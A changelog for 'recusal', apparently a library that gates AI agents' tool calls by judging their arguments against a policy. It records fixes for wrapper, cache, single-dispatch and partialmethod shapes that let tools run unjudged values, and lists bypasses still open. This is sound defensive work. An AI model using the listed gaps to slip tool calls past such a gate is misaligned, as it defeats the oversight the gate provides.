# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/), and the project adheres to
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Changed

- **The draft LlamaIndex adapter's minimum Python is 3.11.** It was 3.10, and its test
  lock therefore pinned Pillow 12.3.0 for Python 3.10: Pillow, which `llama-index-core`
  requires, supports Python 3.11 and later from 13.0.0, the release that fixes the open
  advisories against 12.3.0. The lock now pins Pillow 13.0.0 alone, and the draft's two
  jobs run on Python 3.11 and 3.12. The draft is not released, so no published package
  changes.
- **`recusal-openai-agents` 0.2.2: every refusal the kernel's walk makes by a class of
  its own has a reason that says what was found and what to do, and the package requires
  `recusal` 0.16.0.** No verdict changes beside `recusal` 0.16.0: a tool 0.2.1 refuses
  there is refused, and a tool it gates is gated. Beside the kernel 0.2.1 could be
  installed with, `recusal` 0.15.0 or 0.15.1, some tools were gated that 0.2.2 refuses,
  a few of them although they run correctly: see "Refused although it runs correctly"
  below. Reproduced on `openai-agents` 0.24.0, each with a real tool of that shape.
  - A `BoundArgumentKept` (a facade method that is `functools.wraps` of a function and
    takes its object as `self`, or in `*args`) was refused as "the function it runs
    cannot be inspected (BoundArgumentKept)", and an `UnreadCache` as "cannot be
    inspected (UnreadCache)". Each has a reason of its own now. The first says in the
    gate's own words that the walk cannot tell whether the wrapper passes the bound
    argument on, and that a tool refused for this may run correctly, and passes the
    kernel's text on, whole, as what the walk reports: that text names the parameter
    that could be left open and, where a wrapper took the bound argument under a name,
    that name too, and in `recusal` 0.16.0 it can say a parameter "runs at a default"
    where the parameter has none. The second says that the function the cache calls could not be told.
  - A declared signature (a `__signature__`, a `__text_signature__` that is not the
    interpreter's own) was refused as "cannot be inspected (DeclaredSignature)". The
    reason now says what is carried, that the kernel's walk relies on no declared
    signature and refuses each one, also where this Python would not read it and where
    it matches the real parameters, and what to register in its place.
  - The reason for a `HiddenWrapper` said that the held wrapper "takes a parameter of its
    own" and put the kernel's text in brackets after it. The kernel also raises that
    class for a parameter the tool declares, and where no parameter was found: the way
    from the held wrapper passes a single-dispatch function with an implementation
    registered, or a cache named again for another function that calls anything but a
    plain function, or does not end. The reason now says where the second wrapper is
    held and passes the kernel's text on as the cause. It no longer advises applying
    each decorator to the function directly, which gets a wrapper with a parameter of
    its own refused by another rule.
  - Every reason that advises registering a plain function ends by saying that the gate
    judges that function's parameters and does not read what its body calls. Four did
    not: a callable the gate cannot question, a weak proxy, a decorator it cannot read,
    and too many wrappers.
  - The kernel's classes are imported and asked with `isinstance`. 0.2.1 knew three of
    them by name, because `recusal` 0.15.0 has none of them, so an exception of another
    class with the same name got the reason, and for `HiddenWrapper` its text. The three
    name constants are removed.
  - **The floor is `recusal>=0.16.0`** (it was `>=0.15.0`). The two stacks of decorators
    that review round seven found open, a `functools.partial` that carries a
    `__wrapped__` and `functools.wraps` written above `functools.lru_cache`, are read by
    the walk of `recusal` 0.16.0 and not by that of 0.15.0 or 0.15.1, so 0.2.0 and 0.2.1
    installed beside either of those run a parameter of a wrapper under them unjudged.
    0.2.2 does not allow either.
  - The package page and the docstrings named `recusal` 0.15.0 where a statement holds
    for 0.15.1 too, or no longer holds beside 0.16.0. Each is corrected. The page no
    longer lists every decorator that holds a second wrapper as unseen: it says which
    held wrappers the kernel refuses and which it does not find.
  - **Refused although it runs correctly**, and gated by 0.2.1 beside `recusal` 0.15.1:
    a decorator that holds `functools.lru_cache` over anything but a plain function
    (`functools.partial(f)`, a callable object), named again for `f`, refused as a
    `HiddenWrapper` with no parameter named; and a cache named again for another
    function over a `functools.partial` of a second `functools.lru_cache` wrapper or of
    a `staticmethod` object, for which Python shows no signature, refused as "cannot be
    inspected (ValueError)". A `functools.partial` of a `staticmethod` object under a
    decorator is refused with the reason for an object Python shows no signature for,
    which named only a class-based decorator and now names both; 0.2.1 beside `recusal`
    0.15.1 gated it under a decorator written with `functools.update_wrapper` over a
    `functools.partial`, and refused it under an ordinary `functools.wraps` decorator. Also
    refused although correct, as the kernel's entries for 0.16.0 say: a facade that does
    pass its bound argument on, and a declared signature that matches the real
    parameters.
  - **Arguments that are not JSON text are refused, not raised on.** Found in review
    round nine of `recusal-openai-agents-mcp`, on the hosted approval callback, which
    decides with this package's `refusal`. Arguments that arrived as a `dict`, a list
    or a number left the gate as `TypeError: the JSON object must be str, bytes or
    bytearray` out of `json.loads`. Nothing was approved and nothing ran, but it was an
    exception and not a refusal, and there was no audit entry. The package decodes
    arguments in one place, which the hosted seam, the guardrail of a function tool and
    an agent tool all pass through: it now refuses anything but a `str`, `bytes`, a
    `bytearray` or `None` before the policy runs, with "arguments are not JSON text
    (they arrived as a `dict`, which is not exactly `str`, `bytes` or `bytearray`), so
    they cannot be judged". The reason names the type and nothing the arguments hold,
    and with a log the entry is bound to the name of the type; a class name that is not
    a plain identifier is given as `object`. A `dict` is not taken for arguments
    decoded already. **This refuses what 0.2.1 judged**: an empty `dict`, an empty
    list, `0` and `False` were read as no arguments and judged as `{}`. So was an
    instance of a subclass of `str` that says it is false, and a subclass of `bytes`
    with a `decode` of its own was decoded by it: the type is now asked exactly, and
    the value is never asked whether it is true, so both are refused (neither reaches
    the gate from the model or the SDK). A string, the empty string, `None`, bytes and
    a bytearray are judged as before.
  - **Stated as open on the package page**, found by the review of this release before
    it was made. All of them are in 0.2.1 too, and none is closed here:
    - Behind a `functools.lru_cache` named again for another function
      (`functools.wraps(f)` above the cache), the gate's own questions are not asked:
      its walk follows what the cache names. The kernel's walk reads what the cache
      calls, and there it refuses a single-dispatch function only once an
      implementation is registered, and a weak proxy not at all. So a single-dispatch
      function with nothing registered is gated where the wrapper that reaches it
      carries none of the dispatcher's attributes (`functools.partial(dispatcher)`, a
      `functools.wraps(dispatcher, updated=())` wrapper, a class-based decorator that
      sets only `__wrapped__`). An implementation registered after the calls of a turn
      were judged runs for them, and the judged call itself can be the one that
      registers it (a wrapper that registers on first use). The declared parameters run
      with the judged values; a parameter the implementation adds runs at its default.
      From the next model turn the call is refused.
    - Behind such a cache a `weakref.proxy` is not refused, and what stands behind it
      is not read as what it is. A wrapper with a parameter of its own behind a proxy
      of a second cache named again runs that parameter at its default, with no
      dispatcher anywhere. A dispatcher with an implementation registered before the
      tool is gated, behind `functools.partial(weakref.proxy(dispatcher))`, runs that
      implementation with a parameter of its own at its default, and the call is never
      refused. A `functools.partialmethod` behind a proxy of a second cache named
      again is gated where a `functools.partial` or a wrapper stands between that
      cache and the method, and the callable it holds runs with a parameter of its own
      at its default; with the second cache built directly over the method it is
      refused, only because `functools.lru_cache` copies the partialmethod's mark onto
      that cache.
    - A decorator that holds a `functools.wraps` wrapper which takes the tool's own
      parameters in another order is gated, and the function runs with the values
      swapped (judged `sql=''`, `force=True`; ran `sql=True`, `force=''`). The same
      wrapper on the `__wrapped__` chain is refused. This is in how the kernel reads a
      held wrapper.
    - A decorator that holds a `functools.wraps` wrapper with a parameter of its own is
      gated where the way from that wrapper to the function passes a class-based
      decorator built with `functools.update_wrapper`, a callable object, a
      `functools.partial` that carries a `__wrapped__`, a weak proxy, a cache named
      again, or a second wrapper that is itself only held. The kernel states these as
      not found.

## [0.16.0] - 2026-11-26

A MINOR release of the kernel under `STABILITY.md`: `recusal.invocation`, the module a
gate uses to read the function a tool call runs, refuses what its walk cannot follow to
the end, and has five new public exception classes for those refusals (`HiddenWrapper`,
`UnreadCache`, `DispatchedAtCallTime`, `PartialMethodSignature` and `BoundArgumentKept`).
Each is under Security below, with the shape that ran a value no policy judged, what is
refused now, and what is still not found. `recusal.invocation.detached` no longer calls
itself, under Fixed. No verdict, decision path, reason string of the frozen kernel or
import path changed. Under `recusal/`, 0.16.0 differs from 0.15.1 in `recusal.invocation`
and the version string.

**This release is stricter.** Some tools that 0.15.1 read are refused by 0.16.0, a few of
them although they run correctly; the entries mark those "Refused although it runs
correctly".
Two shapes that 0.15.0 and 0.15.1 refused with a reason that was not true are accepted.
One limit is stated and not closed, under "Still not found, by design" in the entry for
review rounds nine to fifteen.

The adapter changes listed under Security are in the repository and are not released
here: each adapter is a separate distribution on PyPI under its own version and tag, and
none is part of the `recusal` wheel. The same holds for the draft LlamaIndex adapter and
the documentation under Added.

### Added

- **A draft adapter for LlamaIndex, in the tree and not released.**
  [`adapters/drafts/llamaindex`](adapters/drafts/llamaindex/README.md) gates an explicit
  local `FunctionTool`: `gated_tool` returns a wrapper whose `call` and `acall` judge the
  named arguments, defaults included, before the function runs. Its README says what it
  does not cover. Its tests run on every pull request with `llama-index-core==0.14.25`
  installed from a hash lock, on Python 3.10 and 3.12. It is not on PyPI and no release
  workflow offers it; [`adapters/drafts/README.md`](adapters/drafts/README.md) says what
  a draft is and what takes one to a released adapter. Thanks to @Varma0604 for the
  work (#311).
- **Every adapter's wheel is checked on its minimum Python.** For all eight adapter
  packages, CI builds the wheel once and installs those same files on Python 3.12 and on
  the package's declared minimum, read from `pyproject.toml`; both environments run the
  smoke test, `pip check` and the installed-package type check, with the companion wheel
  a package depends on. One test holds every adapter's job to that, and to a hash lock
  resolved for its minimum. Thanks to @hananbahi527 for the work (#320, which completes
  #262 after #310).
- **A command line reference, [`docs/CLI.md`](docs/CLI.md).** One table per command,
  built from what `--help` prints; four flags had been in no document (`init --dir`,
  `init --writable-root`, `doctor --dir`, `verdict --lenient`). A test reads the parser
  and fails if a flag has no row (#166).
- **The README lists every input of the GitHub Action**, `lenient` among them, and a test
  requires a row for each input `action.yml` declares (#167).
- **The Python examples in `docs/EVIDENCE.md` and `docs/MCP.md` are checked** for
  syntax and for imports that exist, as those in `EXTENDING.md` and `HOWTO.md` already
  were (#165).

### Fixed

- **Kernel: `recusal.invocation.detached` no longer calls itself.** It made the copy a
  policy may write to by calling itself once for every value, and two things followed
  from that. Data nested deeper than the stack had room for raised `RecursionError`,
  which is not the `TypeError` a gate turns into a refusal, at a depth that moved with
  the caller's own: a few hundred levels from the top of a stack, fewer from a deep
  application stack, none at all from the bottom of one. And what a copy cost moved
  with where it was called from. Measured on Python 3.12, one copy from each of 144
  depths of the caller's stack: 300,000 integers in one list took 18 ms from most
  depths and 558 ms from two of them; 60,000 small objects took 85 to 424 ms; a million
  characters of empty objects 60 lists down took 303 to 956 ms. (Python 3.12 keeps
  frames in blocks, and a function that calls itself for every value pays for a block
  on each call that falls across the end of one. The same runs on 3.9 and 3.14 moved
  by 1.1 to 1.3 times.) It now keeps its place in each list and object it is copying
  and calls no function written in Python for a value (but the comparison a value's
  own metaclass defines, as before; see round nine below). The same three copies take 12
  to 24 ms, 79 to 102 ms and 146 to 165 ms, and a copy runs from the bottom of the
  stack, whatever the depth of the data.
  - *The same answers.* Every value is tested as before and in the same order, so the
    copy is the same, each `TypeError` has the same message, and the first refusal met
    is the same one: depth first, in the order of the members, with every key of an
    object looked at before any of its members is copied. A list or object reachable
    twice is copied at each place, a cycle is refused, and `ancestors` is read as it
    was. Compared with the version that called itself on generated data (values and
    keys that are not data, shared and cyclic containers, nesting to 400 levels) and
    on the edges (the order of errors, every kind of thing a caller could hand as
    `ancestors`, values whose class answers for another): no difference on Python 3.9
    to 3.15, 3.14 free-threaded included.
  - *The one difference.* Data nested deeper than the old version could follow is
    copied, where `RecursionError` was raised. A caller that counted on that error to
    stop deeply nested data has to bound the depth itself; `json_data` refuses beyond
    64 levels. What is done with the copy afterwards can still run out of stack:
    `recusal.authorization.fingerprint` calls itself for every value, as before.
    One adapter is such a caller (review round nine): `recusal-pydantic-ai`'s plain
    `RecusalGate`, for a tool annotated `list`, `dict`, `Any` or `dict[str, Any]` whose
    arguments reach the gate as a Python dict. Beside 0.15.1 it ran such arguments at
    500 levels of nesting and refused them at 1,000 ("arguments cannot be detached
    for judging (RecursionError)"). Beside this kernel, at 1,000, 10,000 and 100,000
    levels, the policy is called with them, is shown data equal to what the tool
    receives, and the tool runs if the policy allows; a policy that walks the data
    fails closed if it runs out of stack. The audited gate runs them at 400 levels and
    refuses at 500, beside both kernels, because the fingerprint cannot be made. No
    call ran without its policy being called. Arguments that arrive as JSON text ran
    at 150 levels and were stopped at 200 by that framework's own parser. Measured on
    Python 3.12.

### Security

- **Kernel: `recusal.invocation` refuses a wrapper that holds a second `functools.wraps`
  wrapper of the same function.** `reached_parameters` follows a wrapper to what it calls
  through `__wrapped__`. A decorator that applies another wrapper inside itself calls the
  result, held only in its closure, while `functools.wraps` sets its `__wrapped__` to the
  undecorated function, so the wrapper in between was never read. That wrapper could keep
  an argument for itself (`guarded(*args, timeout=30, **kwargs)`: the policy judged
  `timeout=5` and the function ran with its own default) or fill a default of its own
  (`force=True`) with no policy judging it. The walk now raises the new public
  `recusal.invocation.HiddenWrapper`, a subclass of `ValueError`, and
  `unsupported_signature`, which uses the same walk, returns its reason. A gate that
  already refuses on a `ValueError` or any exception from the walk refuses these without a
  change. Nothing that 0.15.0 refused is now accepted. The check is exact: it refuses one
  shape it can read with certainty, runs nothing, and leaves the rest as stated limits.
  - *What is looked at.* A callable on the way that names a `__wrapped__` holds what is in
    its closure cells and the module globals its code names (a plain function) or its
    instance attributes (any other callable, as a class-based decorator). The globals are
    those the code object lists (`co_names`, with those of every function, lambda and
    comprehension defined inside it), each looked up in the function's own `__globals__`
    when that is exactly a `dict`, which is the lookup the function's own code makes each
    time it reads that global; a name the code uses only as an attribute and that is also
    a global is read too, and builtins are not. So a
    wrapper written beside the function it wraps, which calls a second wrapper or a
    single-dispatch function of that same function by its global name, is refused like
    one that holds it in a closure. A helper, a logger or a formatter the wrapper calls,
    and a wrapper, a `functools.partial` or a dispatcher of another function, are not
    refused: nothing held counts unless it reaches a callable the walk read. A held value is followed only if it is of a closed set of
    types CPython itself builds: a plain function, a bound method, `functools.partial`,
    `staticmethod`, `classmethod`, and the `functools.lru_cache` wrapper. What it passes a
    call on to (a function's or an `lru_cache` wrapper's own `__wrapped__`; a method's,
    `partial`'s, `staticmethod`'s or `classmethod`'s function) is followed link by link
    through that same set, until a link is, by identity, a callable the walk read: any
    callable this walk took the parameters of (the tool, everything a `__wrapped__` on the
    way named, a callable object's `__call__`), or the function of a method or a
    `functools.partial` it took them through.
  - *What is refused.* Each plain function passed on that way is a wrapper the walk never
    read. It is judged by the same rule, and the same code, as a wrapper the walk does
    read: refused when it takes a name the tool does not declare, or, being a wrapper that
    passes `*args` or `**kwargs` on, keeps a name another callable on the way takes too.
    The reason names the parameter, as it does for a wrapper the walk reads. A receiver is
    not a parameter of its own: when the tool is a bound method (or a `classmethod`, or a
    `functools.partial` that binds positional arguments), a wrapper its decorator holds is
    passed the same receiver, so its first positional parameter is left out, whatever it is
    called, exactly as it is for the level the walk reads. Every argument bound on the way
    is counted: one for each method, and each positional argument of each
    `functools.partial`, on the walk and along what is held (for a subclass of
    `functools.partial` on the walk too, through the accessor of the type itself, so a
    property of the subclass is not read for it). So the parameters of a wrapper
    get the same verdict, for the same reason, held inside a decorator and applied
    directly, with one exception: under a tool that is a `functools.partial` binding a
    keyword (`partial(tool, limit=3)`), a held wrapper that takes that name and `*args`
    but no `**kwargs` is refused, while the same wrapper applied directly is accepted,
    because `inspect.signature` of such a partial no longer shows the `*args` (the call
    fails either way). Only its parameters: applied directly, a wrapper can also be refused for
    something a held one is not read for, a declared `__signature__` (a tracing decorator
    that declares one and takes an extra parameter is refused directly for the signature
    and, held, for the parameter). Two ways are refused as they stand, with the reason "a
    wrapper holds another wrapper of the function it wraps, which the walk does not
    follow": one through a single-dispatch function, or the function a single-dispatch
    method hands out, that can run more than its base, and one still going at its 32nd
    link (a held wrapper up to 31 links from a callable the walk read is judged; one
    further is refused).
  - *What is not.* A decorator that holds the function it wraps, configuration and
    helpers; a second wrapper that only passes `(*args, **kwargs)` on, `functools.lru_cache`
    included; one that copies the tool's own parameters, as signature-preserving decorators
    generate; and everything under "not found" below.
  - *What a library user will see.* A class-based decorator that keeps an extra entry
    point on the decorator object is refused when that entry point is a wrapper with a
    parameter of its own (`self.with_retry = retry(self.__call__)`,
    `self.batch = batched(self.function)`), although the tool call never goes through it:
    the kernel cannot know which attribute `__call__` uses. Keep such helpers off the
    decorator object (a module-level function, a method), or build them on demand.
  - *Nothing held is run.* A function can hold anything (a lazy proxy that connects when
    touched, a remote stub that answers every attribute). A held value's type is read with
    `type()`. If it is not exactly one of the closed set, nothing else of it is read. If it
    is, it is read only through what that type itself defines in C: its accessors, and for
    a plain function its `__code__`, its `__closure__` and the contents of its cells,
    which no class can stand in for. No attribute an application could answer is looked
    up on a held value, no descriptor its class declares is called, and values are
    compared by identity only. A dictionary that is read (a function's `__dict__`, an instance's, a
    class's) is listed in one call into C, so another thread changing it cannot change it
    halfway through, and no key is looked up in it: a key is compared only when it is
    exactly a `str`, so no key's `__hash__` or `__eq__` runs. On Python 3.9 to 3.11 that
    call is not one step: it makes a tuple for each item, a collection can start at any
    of them, and a finalizer or weak-reference callback the collection runs can change
    the size of the dictionary being listed, which then raises `RuntimeError`. The
    listing is made again, up to eight times, and a dictionary that changed at every one
    is not read: the walk raises `ValueError`, which a gate turns into a refusal. From
    3.12 a collection does not start inside the call. One dictionary is read by lookup
    and not by listing, the module globals a wrapper names: every name looked up is
    exactly a `str`, as is every key of an ordinary module, and the lookup then runs no
    code but the dictionary's own; a key that is not exactly a `str` is compared, by its
    own `__eq__`, only if it hashes as one of the names looked up, as it is each time
    the wrapper itself reads that global.
  - *Not found, by design.* A second wrapper that does not itself name what it wraps as
    `__wrapped__`: a plain inner function, a lambda, a helper, a callable object, a bound
    method of an object that holds the function. One that is, or is held by, an object of
    any type outside the closed set: a callable object, a proxy (lazy proxies, wrapt), a
    wrapper a C extension builds, a subclass of a type of the closed set. One whose way
    to the function it wraps passes THROUGH such an object: a second wrapper reached
    through a proxy, as a method a `wrapt` decorator binds. One held anywhere
    but where a callable on the way that names a `__wrapped__` holds things (its closure
    cells and named module globals if it is a plain function; its instance attributes and
    the closure cells and named module globals of its class's `__call__` if it is any
    other callable): one held by a callable on the way that names nothing as
    `__wrapped__`, a class attribute, a slot, a container (in a global too), a function's
    own attribute (`tool.aio`), a global of another module reached through an attribute
    (`helpers.guarded`), a global of a function whose `__globals__` is not exactly a
    `dict`. A class-based decorator whose own method keeps the argument. A wrapper
    that names nothing as `__wrapped__` (one that copies the signature by hand). An
    argument taken in a body alone (`kwargs.pop`), which no signature shows. The arguments
    a `functools.partial` binds. Anything held behind an object that passes for a
    `functools.partial` only because another class was put in `functools` after the first
    walk: its bound arguments are not known. A held wrapper that cannot take the bound arguments at all
    (fewer positional parameters than the arguments bound on the way) and has no parameter
    of its own: the call fails when it is made. And everything, in a process where
    `functools` is not a plain module, or its `partial` or its `lru_cache` wrapper is not
    the type C code defines, when the first walk is made: both checks are then off and the
    walk is what it was in 0.15.0.
  - *Nothing at import.* Importing `recusal.invocation` reads nothing of `functools` that
    0.15.0 did not read, runs no code that stands there and raises nothing that
    importing 0.15.0 does not raise, whatever a process put in `functools`, in
    `sys.modules` or in the audit hooks first, with one exception: a `KeyboardInterrupt`
    raised while one of the two modules below is imported is passed on. It does
    import two modules 0.15.0 did not, `gc` and `weakref`, as any import is made (a
    finder or an audit hook the process installed is asked, and `weakref` is run if
    nothing imported it before), each inside a guard: where the process refuses one
    (None in `sys.modules`, a hook that raises, whatever it raises but an interrupt from
    the keyboard), the module is imported all the same, without it, and reads as 0.15.0
    does where it would have used it. Nothing is imported at a walk. What the
    checks read with is found at the first walk, from the standard library's own objects,
    each identified before it is used (a plain module, types C code defines, functions
    compiled from the standard library's own file) and none of them called. What the first
    walk finds stands for the process: threads that make their first walk at once settle
    on one finding, and a `functools` that is patched when the first walk is made and
    restored afterwards leaves the checks as that walk found them. Reading the
    names of a held function's closure cells reads its code object, which raises the
    `object.__getattr__` audit event for `__code__`, as reading a signature does.
  - *New in the signature.* `reached_parameters(func, skip=())` takes the names the
    framework injects, as `unsupported_signature` does, so that a held wrapper is judged
    with them too.
- **Kernel: `recusal.invocation` refuses a function chosen at call time by the type of an
  argument.** A `functools.singledispatch` function names its base implementation as
  `__wrapped__`, so `reached_parameters` read the base only. An implementation registered
  for a type runs in its place when the first argument is of that type, and a default of
  its own (`skip_review=True`) ran with no policy judging it. The walk now raises the new
  public `recusal.invocation.DispatchedAtCallTime`, a subclass of `ValueError`, and
  `unsupported_signature` returns the reason "the function that runs is chosen at call
  time by the type of an argument, which the walk cannot read". Nothing that 0.15.0
  refused is now accepted.
  - *What is refused.* A callable on the way that is the function `functools.singledispatch`
    itself returned, known exactly: a plain function whose code object is that of the
    `wrapper` defined inside `functools.singledispatch`. Its real registry, the plain
    `dict` in the closure of its `dispatch` function, must be `{object: base}`, where the
    key is `object` and the entry is the function it names as `__wrapped__`, both by
    identity. So a registered implementation is refused, and so is `register(object, ...)`,
    which replaces the base and leaves the one key. The callable a
    `functools.singledispatchmethod` hands out at each access is known the same exact way
    and held to the same rule. Where it keeps the way to its registry differs by Python
    and is read from the code of `singledispatchmethod.__get__` at the first walk, without
    building or calling anything: a closure cell holding the descriptor (3.9 to 3.12), a closure
    cell holding the `dispatch` function (3.13), an instance attribute holding the
    descriptor (3.14 and 3.15, where what is handed out is an object). Run on 3.9 to 3.15,
    3.14 free-threaded included. A wrapper that names the base function and calls a
    dispatcher held in its closure is refused as a `HiddenWrapper`; so is one that holds
    the function a registered single-dispatch method handed out, on 3.9 to 3.13.
  - *What is not.* A single-dispatch function or method with only its base implementation,
    which is walked as before. A wrapper of one: `functools.update_wrapper` copies
    `registry`, `dispatch` and `register` onto every wrapper of a dispatcher, so those
    attributes identify nothing and are not read; the dispatcher itself is judged when the
    walk reaches it. A callable that merely holds a dispatcher, or whose class has a
    single-dispatch method beside the one called.
  - *Nothing is run.* `dispatch` is never called. The registry is read only when the
    closure holds a plain `dict`, listed in one call as every dictionary above is;
    anything else there is refused, unread.
  - *Not found, by design.* A dispatch written by hand in a function's body; a dispatcher
    another library builds; an implementation registered after a gate has read the tool; a
    dispatcher reached through a wrapper or a helper that names nothing as `__wrapped__`;
    a dispatcher whose closure was rewritten by hand. A registered single-dispatch method
    that a wrapper holds, on Python 3.14 and later, where what is handed out is an object
    outside the closed set. A process in which `functools.singledispatch` was wrapped or
    replaced before the first walk: none of that code is run and the dispatcher's code is
    then not identified, so this whole check is off there (it refuses nothing, and a
    base-only single-dispatch method is walked as before); a `functools.singledispatchmethod`
    that was replaced, or whose `__get__` was patched (on 3.14 and later also the class it
    hands out, or that class's `__init__` or `__call__`), turns off the method half only.
    A dispatcher built by a `functools` reloaded (`importlib.reload`) after the first walk:
    the dispatcher is known by the code object of the standard library's function as it
    stood then, and a reload compiles new ones. And a Python that builds
    `functools.singledispatch` another way than 3.9 to 3.15 do (a test fails there first).
- **Kernel: `recusal.invocation` refuses a `functools.partialmethod` that shows
  parameters not its own.** Found by review round twelve of `recusal-pydantic-ai`, and
  closed in the kernel so that every gate that uses the walk gets it.
  `functools.partialmethod(f, ...)` over a callable that does not bind as a method (a
  callable object, a class-based decorator's instance; a plain function too, when the
  method is taken from the class) hands out a method of a function `functools` builds.
  That function calls `f` from its closure, names nothing as `__wrapped__`, and carries
  a mark (`_partialmethod` up to Python 3.12, `__partialmethod__` from 3.13) that
  `inspect.signature` reads in place of its own parameters: it shows the parameters of
  `f` less what is bound. So `reached_parameters` read one level that was no callable's
  own and nothing of `f`: not its `__call__`, not a wrapper under it, not a default any
  of them fills. A policy judged `table='orders'` and the object ran with the bound
  `'customers'`; a wrapper under a class-based decorator ran `table='archive'` from a
  default no policy saw. The walk now raises the new public
  `recusal.invocation.PartialMethodSignature`, a subclass of `TypeError`, which every
  gate that refuses on a failure of the walk already refuses. Its message names the
  cause and what to do: register a plain function that calls it, or put the
  `partialmethod` over a plain function. `unsupported_signature` returns that message,
  and asks for it before it looks at the parameters: the one such tool it accepted was
  a `partialmethod` that leaves no parameter to judge, and one that leaves a parameter
  was refused as "`limit` is not annotated with a supported data type", which was about
  a signature that is not the tool's own (the function `functools` builds carries no
  annotations). Every other reason is given in the order it was. Nothing that 0.15.0
  refused is now accepted.
  - *What is refused.* A callable that `inspect.signature` would read as a
    `functools.partialmethod`: one that shows, under either name (both are looked for on
    every Python), an instance of `functools.partialmethod`. It is looked for wherever
    `inspect.signature` looks: on the callable, on a method's function, on a
    `functools.partial`'s function and on a callable object's `__call__`.
    `functools.update_wrapper` copies the mark onto every wrapper of such a method
    (`functools.wraps`, `functools.lru_cache`, a class-based decorator), and
    `inspect.signature` then shows the partialmethod's parameters in place of that
    wrapper's own, so those are refused too.
  - *What is not.* A `functools.partialmethod` over a plain function, a `classmethod` or
    a `staticmethod`, read from an instance: that is a `functools.partial` of the bound
    function, it carries no mark, and it is walked as before. An attribute of one of the
    two names that is not a `functools.partialmethod`: `inspect.signature` does not read
    it, and neither does the walk.
  - *Nothing is prepared and nothing is run.* The test is the one `inspect.signature`
    makes, an attribute lookup on a callable of the walk and an `isinstance`, made only
    for a callable that shows something under one of the two names, and only while
    `functools.partialmethod` is a plain class (its type is exactly `type`, as the
    standard library's is). It needs none of what the first walk prepares, and holds
    where the two checks above are off. Where something else stands in `functools` under
    that name (a tracing function, a class with a metaclass of its own), or nothing does,
    the check asks nothing and refuses nothing: a callable without a mark is read as
    0.15.0 reads it, and one with a mark is left to `inspect.signature`, as in 0.15.0.
  - *Not found, by design.* A partial application written by hand, and a callable that
    reaches such a method through a helper that names nothing as `__wrapped__` and does
    not carry the mark.
  - Run on Python 3.9 to 3.15, 3.14 free-threaded included.
- **Kernel: four more shapes the walk read wrongly are refused, found by review round
  six.** Each was accepted by 0.15.0 too, and each ran a value no policy judged. Nothing
  that 0.15.0 refused is now accepted.
  - *A `__wrapped__` carried by a `functools.partial`.* A decorator written as
    `functools.wraps(f)(functools.partial(helper, f))` shows the signature of `f`, and
    the walk followed the partial's function (the helper) and never the name the partial
    itself carries: a wrapper under it with a parameter of its own was not read (judged
    `limit=5`, ran `limit=10`). The walk now follows that name like any other
    `__wrapped__`, so what is under it gets the verdict it would get under a nested
    function. The decorator alone, over a plain function, is read and accepted.
  - *A `functools.lru_cache` wrapper that names one function and calls another.*
    `@functools.wraps(f)` above `@functools.lru_cache` above a wrapper (or
    `functools.update_wrapper(cached, f)`) overwrites the cache's `__wrapped__` with `f`;
    the walk read the cache as `f`, and the wrapper the cache really calls is held only
    in C. `gc.get_referents` lists what a cache refers to from the wrapper's own C type,
    without looking up an attribute or calling anything the application wrote, and in a
    fixed order: on Python 3.10 to 3.15 the wrapper's type, then for each entry of a
    bounded cache its key, its result and the entry's type, then the cache's dictionary,
    the function, an `object()`, the entry type, the `CacheInfo` class and the wrapper's
    own `__dict__`; on 3.9 the entries' keys and results, then the function, the cache's
    dictionary, `CacheInfo` and the `__dict__`. So the function is the fifth from the
    end (the fourth on 3.9) and is never one of the cached keys and results, which all
    come before the cache's dictionary; `tests/test_invocation.py` holds each of the
    eight interpreters to that layout, for unbounded, bounded, typed and zero-size
    caches, empty and used, with functions among the cached keys and results. The walk
    picks the function out by its place and READS it as what the cache calls: a caching
    decorator whose wrapper only passes its arguments on is accepted, and one whose
    wrapper has a parameter of its own gets the refusal that wrapper gets without the
    cache, naming the parameter. What that wrapper holds (a second wrapper in its
    closure) and what it is (a single-dispatch function) is judged as for a wrapper that
    names the function itself, and a cache a wrapper holds is read the same way. On a
    method the same: a method over such a cache is read as what the cache calls, with
    the object bound, whether that is a plain function, a `functools.partial`, a
    callable object or a second cache named again (until review round seven it was read
    by the name unless the cache called a plain function). A cache on the function
    itself is read as before. Where the list is not laid out either
    way, the cache is refused, whatever is listed and a cache on the function itself
    included (no supported interpreter lays it out another way, and a test holds each
    to that), with the new public `recusal.invocation.UnreadCache`, a subclass of
    `HiddenWrapper` ("a `functools.lru_cache` wrapper names one function as
    `__wrapped__` and calls another, which cannot be told from what the cache refers to;
    apply the cache to the function itself, or call the cached function from a plain
    function and register that one"). *Not found, by design:* all of it where `gc`
    could not be imported, is not the interpreter's own module at the first walk, or has
    anything under `get_referents` but its own built-in function of that name (another
    function of `gc` put there would list something else); where the listing raises (an
    audit hook on `gc.get_referents`, whatever it raises but an interrupt from the
    keyboard); where the checks are off; and for an instance of a subclass of the cache
    type, which only Python 3.9 lets a class be: the cache is then read by its name, as
    in 0.15.0. A hook that stops the listing is not passed on, because 0.15.0 asked no
    such question and reads every such tool; a `BaseException` a hook raises at any
    other read of the walk is passed on, as in 0.15.0. What a cache calls cannot change,
    so it is told once per cache and kept for the next walk: a full cache of 100,000
    entries is listed once (about 5 milliseconds on 3.12) and not on every call. It is
    kept in a plain `dict` under the cache's `id()`, beside a weak reference to the
    cache that tells it from a later object at the same address, and holds the function
    weakly too: neither lives longer for it, no code written in Python runs to read or
    write it (no `weakref.WeakKeyDictionary`, no callback), and where `weakref` could
    not be imported or its `ref` is not the interpreter's own weak reference type
    nothing is kept (that type is known as the one C code defines whose own dictionary
    lays out `__callback__` as a member; a class written in Python, or another
    built-in type under the name, is not used). Two costs remain, stated. The FIRST
    walk of each cache lists it, and on a free-threaded build a listing stops every
    thread: review round eight measured, on 3.14 free-threaded, 16 threads that each
    walk a new cache named again at 570 walks a second where 0.15.0, which lists
    nothing, made 103,061 (a cache walked before: 85,186 against 113,458). And an entry
    whose object is gone is dropped only at the next sweep, when the dictionary has
    reached twice the entries that were live at the last one (256 at least): the same
    round measured, on 3.12, 100,000 such caches alive and walked at 35.6 MiB, and
    dropped at once their entries at 29.3 MiB (about 300 bytes each) until 12,116 more
    objects had been walked. One reading is
    kept as 0.15.0 made it, so that nothing it refused is now accepted: a method over a
    cache NAMED for something that is not a plain function (a cache of a cache) is read
    by the names alone, without the object bound, which refuses it for the method's
    `self` though such a call runs clean. The wrapper a cache of that kind calls is read
    all the same, as a callable of its own.
